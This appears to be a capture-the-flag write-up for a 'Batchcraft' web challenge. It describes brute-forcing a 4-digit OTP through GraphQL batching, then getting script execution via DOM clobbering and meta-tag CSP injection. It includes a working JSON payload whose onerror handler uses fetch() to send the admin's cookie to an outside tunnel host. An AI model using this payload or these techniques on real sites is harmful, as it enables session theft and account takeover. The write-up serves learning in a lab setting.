# Batchcraft

Have a logoin `vendor53:PotionsFTW!`

Saw 2FA endpoint... played around a bit, thought some kind of direct access or bypassing would work, eventually clued into the name batch, and graphQL batching in a google search. Checked the OTP helpes, and noticed the pin was only 4 digits. Put together a python script to generate a mutation for each pin. Ended up having to split it into 10 requests. Copied into a shell script and output into a file, grepped for the word 'token'. Set this as my new cookie, and was able to access the dashboard.

Next figured it would have to be some kind of xss with meta tag. Was able to do redirects, but needed to execute javascript to be able to access the cookie. Noticed DomPurify wasn't the latest version, went to their release page to see what had been changed since, saw a note on DOM clobbering, and went into looking what that was... was pretty cool, could replace existing js with user defined, and craft it in a way to perform diferant tasks.

Needed to disable the global.js from loading, since was going to use the product.js to access a new `potionTypes` object. Based on the challenge, created the following payload for a new potion, and was able to get js execution:

```json
{
    "product_name":"test",
    "product_desc":"<img id=\"0\" name=\"potionTypes\" src=\"/test\" /><img id=\"1\" name=\"potionTypes\" src=\"/dne.jpg#'onerror=fetch('https://batchraft-bitch.tunnelto.dev?admin='+btoa(document.cookie),{mode:'no-cors'})//\" />",
    "product_price":"0",
    "product_category":"1",
    "product_keywords":"keywords",
    "product_og_title":"title",
    "product_og_desc":"\"><meta content=\"'unsafe-inline'; script-src http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js 'unsafe-inline'\" http-equiv=\"Content-Security-Policy"
}
```

IP of 127.0.0.1 was because the bot accessing the page would be doing so behind a firewall. Admin was kind enough to point me in the right direction.
